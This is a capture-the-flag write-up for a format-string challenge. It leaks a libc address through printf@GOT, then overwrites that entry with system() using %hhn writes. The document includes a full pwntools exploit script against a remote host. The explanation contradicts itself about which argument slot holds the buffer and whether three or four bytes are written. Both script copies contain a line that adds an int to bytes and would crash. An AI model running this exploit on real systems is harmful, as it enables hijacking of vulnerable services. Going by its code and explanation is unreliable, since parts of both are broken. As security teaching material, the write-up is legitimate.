An expanded, beginner-friendly version of your writeup is presented below. The explanations of how format strings resolve arguments on the x86_64 stack, how the `%s` arbitrary read functions, and the math connecting runtime leaks, static libc symbol offsets, and the dynamic base address have been restructured for clarity.

---

# Medium-Format String — Beginner-Friendly Writeup

## Challenge Summary

| Key | Value |
| --- | --- |
| **Binary** | `fsb_got` (64-bit ELF, x86_64) |
| **Mitigations** | **No PIE**, **Partial RELRO**, NX Enabled, Canary Enabled |
| **Provided Files** | `fsb_got`, `fsb_got.c`, `libc.so.6` |
| **Vulnerability** | Uncontrolled Format String (`printf(line)`) in a 3-iteration loop |
| **Target Goal** | Leak libc $\rightarrow$ Overwrite `printf@GOT` with `system` $\rightarrow$ Spawn shell |

---

## 1. Vulnerability Analysis & Mitigations

Here is the loop in `fsb_got.c`:

```c
for (int i = 0; i < 3; i++) {
    write(STDOUT_FILENO, "say something: ", 15);
    read(STDIN_FILENO, line, LINE_MAX);
    printf(line);              // <-- Uncontrolled Format String Bug
    write(STDOUT_FILENO, "\n", 1);
}

```

### Why is this vulnerable?

The secure way to print untrusted input is `printf("%s", line)`. Passing `line` directly as the first argument causes `printf` to parse whatever characters you send as format specifiers (`%p`, `%s`, `%n`).

### What do the binary protections tell us?

Running `checksec fsb_got` reveals two critical settings:

1. **No PIE (Position Independent Executable):** The binary code and Global Offset Table (GOT) always load at fixed, unchanging memory addresses (e.g., `0x400000` region). We can look up `printf@GOT` ahead of time in Ghidra/pwntools and use that exact pointer directly.
2. **Partial RELRO (Relocation Read-Only):** The `.got.plt` section remains **writable** at runtime. If we can write to the GOT entry for `printf`, any future call to `printf(...)` will jump to our replacement function instead.

Because the loop runs **exactly 3 times**, the exploit workflow is:

* **Round 1 (Leak):** Read `printf@GOT` to reveal where standard C library (`libc`) resides in memory.
* **Round 2 (Overwrite):** Overwrite `printf@GOT` with the runtime address of `system()`.
* **Round 3 (Trigger):** Send `"cat flag.txt"`. When `printf(line)` executes, it runs `system("cat flag.txt")`.

---

## 2. Core Concepts: Memory Layout & Leaking

### How Does `printf` Access Arguments on x86_64?

Under the System V AMD64 ABI, function arguments are passed in registers first, then on the stack:

| Order | Argument Destination |
| --- | --- |
| **1st** | `RDI` (Holds the format string itself) |
| **2nd** | `RSI` |
| **3rd** | `RDX` |
| **4th** | `RCX` |
| **5th** | `R8` |
| **6th** | `R9` |
| **7th+** | Stack slots (`RSP`, `RSP+8`, `RSP+0x10`, ...) |

When `printf(line)` runs without additional parameters:

* `RDI` points to your buffer `line`.
* `printf` assumes arguments 2 through 6 are sitting in `RSI`, `RDX`, `RCX`, `R8`, `R9`.
* The **7th argument** that `printf` expects to find is the very top of the stack (`RSP`).

Because `line` is a local stack buffer allocated inside `main`, `line` itself sits directly on the stack! By probing with positional specifiers (`%1$p`, `%2$p`, etc.), we determine which argument index corresponds to the beginning of our own input buffer:

```text
Arg 1:  RDI (format string pointer)
Arg 2:  RSI
Arg 3:  RDX
Arg 4:  RCX
Arg 5:  R8
Arg 6:  R9
Arg 7:  Stack slot 0 (line[0..7])  <-- Our buffer begins here!

```

Sending `AAAA.%p.%p.%p.%p.%p.%p` prints our `AAAA` (`0x41414141`) at positional argument **6** or **7** depending on the stack frame setup. In this binary, `line[0..7]` corresponds to argument index **6**.

---

### How the Leak Works: `%s` as an Arbitrary Memory Read

* `%p` prints the *numerical value* stored in a register or stack slot.
* `%s` treats the value stored in that slot as a **pointer** (a memory address) and prints the raw string bytes located at that address until it hits a null terminator byte (`\x00`).

To leak the contents of `printf@GOT`:

1. We place the memory address of `printf@GOT` into our buffer on the stack.
2. We point a `%s` specifier directly at that stack slot.
3. `printf` dereferences `printf@GOT` and outputs the runtime memory address stored inside it!

#### Stack Alignment Trick:

Since our buffer begins at stack argument **6**:

* Slot 6 (Bytes 0–7 of `line`): We put the format string `b"%7$sAAAA"`.
* Slot 7 (Bytes 8–15 of `line`): We place `p64(elf.got['printf'])`.

```text
               Slot 6 (8 bytes)             Slot 7 (8 bytes)
Stack:  [  '%'  '7'  '$'  's'  'A'  'A'  'A'  'A'  ] [   0x0000000000601020   ]
                                                                |
                                                                v
                                                       Points to printf@GOT

```

When `printf` evaluates `%7$s`, it jumps directly to Slot 7, treats `0x601020` as an address, reads the libc pointer stored there, and prints it out. The trailing `"AAAA"` acts as an explicit delimiter so pwntools can extract the binary pointer cleanly.

---

### Understanding the Math: Leaked Address vs. Real Offsets

Modern operating systems use **ASLR (Address Space Layout Randomization)**. Every time the program runs, the entire `libc.so.6` library is loaded at a random base address in memory:

```text
+-------------------------------------------------------------+
|                         libc.so.6                           |
+-------------------------------------------------------------+
^                                 ^                 ^
|                                 |                 |
libc_base (Randomized)      printf()          system()
|<------- offset_printf -------->|                 |
|<---------------- offset_system ----------------->|

```

Even though the base changes on every run, **the distance (relative offset) between functions inside the library never changes**.

1. **Static Offset (from the ELF file):**
Using the provided `libc.so.6`, pwntools inspects the symbol table:

$$\text{offset}_{\text{printf}} = \text{libc.symbols}['\text{printf}']$$


$$\text{offset}_{\text{system}} = \text{libc.symbols}['\text{system}']$$


2. **Runtime Address (Leaked from the GOT):**
Our `%7$s` leak returns the live, randomized address where `printf` currently lives:

$$\text{addr}_{\text{printf}} = \text{printf\_leak}$$


3. **Calculating the Libc Base:**

$$\text{libc\_base} = \text{addr}_{\text{printf}} - \text{offset}_{\text{printf}}$$


4. **Calculating the Real Address of `system`:**

$$\text{addr}_{\text{system}} = \text{libc\_base} + \text{offset}_{\text{system}}$$



#### Pwntools Pitfall: Double-Counting

When using pwntools:

```python
libc.address = printf_leak - libc.sym["printf"]

```

Once `libc.address` is set, pwntools **automatically rebases all symbols in `libc.sym**`. Therefore:

* `libc.sym["system"]` is now the **final absolute address**.
* Writing `libc.address + libc.sym["system"]` is incorrect because it adds the base address a second time, resulting in an unmapped address crash.

---

## 3. Step-by-Step Exploitation

### Stage 1: Leak `printf@GOT`

```python
p.recvuntil(b"say something: ")

# Send format string at slot 6, target address at slot 7
p.sendline(b"%7$sAAAA" + p64(elf.got["printf"]))

# Read until our delimiter 'AAAA', slice off the delimiter, and unpack into a 64-bit integer
raw_leak = p.recvuntil(b"AAAA")[:-4]
printf_leak = u64(raw_leak.ljust(8, b"\x00"))

# Compute library base and system() address
libc.address = printf_leak - libc.sym["printf"]
system_addr = libc.sym["system"]

log.success(f"Leaked printf() : {hex(printf_leak)}")
log.success(f"Libc Base       : {hex(libc.address)}")
log.success(f"Calculated system() : {hex(system_addr)}")

```

---

### Stage 2: Overwrite `printf@GOT` using Monotonic `%hhn`

We need to overwrite the 8-byte pointer inside `printf@GOT` with `system_addr`.

* `%n` writes 4 bytes.
* `%hn` writes 2 bytes (short).
* `%hhn` writes **1 byte** (char).

#### Why avoid `fmtstr_payload` or `%hn` here?

The target binary sets `setvbuf(stdout, NULL, _IONBF, 0)` (unbuffered I/O). Writing large values using `%hn` forces `printf` to emit tens of thousands of space/padding characters (`%65000c`). Over an unbuffered network connection, this can trigger packet stalls or trip the 120-second alarm.

Because `printf` and `system` share the same upper bytes in libc (e.g., `0x7f...`), only the lowest **3 bytes** typically differ:

| Byte Index | `printf` Byte | Target `system` Byte | Write Address |
| --- | --- | --- | --- |
| 0 | `0xf0` | `0x70` (112) | `printf@GOT + 0` |
| 1 | `0xf6` | `0xfd` (253) | `printf@GOT + 1` |
| 2 | `0x94` | `0x93` (147) | `printf@GOT + 2` |

#### Monotonic Ordering Rule:

`%hhn` writes the **total count of characters output so far**. Because the printed character counter can only increase, we must sort our byte writes in **ascending order of value**:

1. Print 112 characters $\rightarrow$ write `0x70` to `printf@GOT + 0`
2. Print $147 - 112 = 35$ characters $\rightarrow$ write `0x93` to `printf@GOT + 2`
3. Print $253 - 147 = 106$ characters $\rightarrow$ write `0xfd` to `printf@GOT + 1`

Total output is only 253 bytes, avoiding network buffers and socket freezes completely.

```python
changes = []
for i in range(4):
    old = (printf_leak >> (8 * i)) & 0xFF
    new = (system_addr >> (8 * i)) & 0xFF
    if old != new:
        changes.append((new, i))

# Sort writes by byte value (ascending)
changes.sort()

# Dynamically align stack positions for the addresses
N = len(changes)
idx = list(range(11, 11 + N))
for _ in range(10):
    parts, prev = [], 0
    for (val, off), i in zip(changes, idx):
        parts.append(f"%{val - prev}c%{i}$hhn".encode())
        prev = val
    fmt = b"".join(parts)
    pad = b"A" * ((8 - len(fmt) % 8) % 8)
    total = len(fmt) + pad
    nidx = list(range(6 + total // 8, 6 + total // 8 + N))
    if nidx == idx:
        break
    idx = nidx

payload = fmt + pad + b"".join(p64(elf.got["printf"] + off) for _, off in changes)

p.recvuntil(b"say something: ")
p.sendline(payload)

```

---

### Stage 3: Trigger `system("/bin/sh")`

On the third iteration of the loop:

1. `read(STDIN_FILENO, line, LINE_MAX)` reads our input into `line`.
2. The code calls `printf(line)`.
3. The binary looks up `printf` in `.got.plt`, which now contains the address of `system`.
4. It calls `system(line)`.

By sending `cat flag.txt` (or `/bin/sh`), the shell command executes directly:

```python
p.recvuntil(b"say something: ")
p.sendline(b"cat flag.txt")

```

---

## 4. Full Exploit Script

```python
#!/usr/bin/env python3
import time
from pwn import *

context.binary = elf = ELF("./fsb_got", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

p = remote("47.83.170.192", 32814)

# -------------------------------------------------------------------------
# Step 1: Leak printf runtime address via %7$s
# -------------------------------------------------------------------------
p.recvuntil(b"say something: ")
p.sendline(b"%7$sAAAA" + p64(elf.got["printf"]))

raw_leak = p.recvuntil(b"AAAA")[:-4]
printf_leak = u64(raw_leak.ljust(8, b"\x00"))

# Calculate base address and system() symbol
libc.address = printf_leak - libc.sym["printf"]
system_addr = libc.sym["system"]

log.success(f"printf() leaked : {hex(printf_leak)}")
log.success(f"libc base       : {hex(libc.address)}")
log.success(f"system()        : {hex(system_addr)}")
assert (printf_leak >> 32) == (
    system_addr >> 32
), "Libc base calculation mismatch!"

# -------------------------------------------------------------------------
# Step 2: Craft minimal %hhn overwrite payload
# -------------------------------------------------------------------------
got = elf.got["printf"]
changes = []
for i in range(4):
  old = (printf_leak >> (8 * i)) & 0xFF
  new = (system_addr >> (8 * i)) & 0xFF
  if old != new:
    changes.append((new, i))
changes.sort()

N = len(changes)
idx = list(range(11, 11 + N))
for _ in range(10):
  parts, prev = [], 0
  for (val, off), i in zip(changes, idx):
    parts.append(f"%{val - prev}c%{i}$hhn".encode())
    prev = val
  fmt = b"".join(parts)
  pad = b"A" * ((8 - len(fmt) % 8) % 8)
  total = len(fmt) + pad
  nidx = list(range(6 + total // 8, 6 + total // 8 + N))
  if nidx == idx:
    break
  idx = nidx

payload = fmt + pad + b"".join(p64(got + off) for _, off in changes)

p.recvuntil(b"say something: ")
p.sendline(payload)

# -------------------------------------------------------------------------
# Step 3: Trigger hijacked function
# -------------------------------------------------------------------------
p.recvuntil(b"say something: ")
p.sendline(b"cat flag.txt")

time.sleep(1)
print(p.recvrepeat(2).decode(errors="replace"))
p.close()

```

---

## 5. Summary of Key Lessons

1. **`%s` Dereferences Pointers:** Placing an address on the stack and referencing it with `%s` prints whatever data resides at that memory location, giving you an arbitrary read primitive.
2. **ASLR Preserves Function Distances:** While the base address changes every run, the relative offsets between functions inside `libc` stay identical. Leaking one function discloses the entire library layout.
3. **Avoid Output Flooding:** `%hhn` writes single bytes and minimizes the total output length, preventing socket timeouts and buffer hangs on network services.
4. **Mind Pwntools Re-basing:** Assigning `libc.address` updates internal symbol definitions automatically; do not add `libc.address` to `libc.sym[...]` again.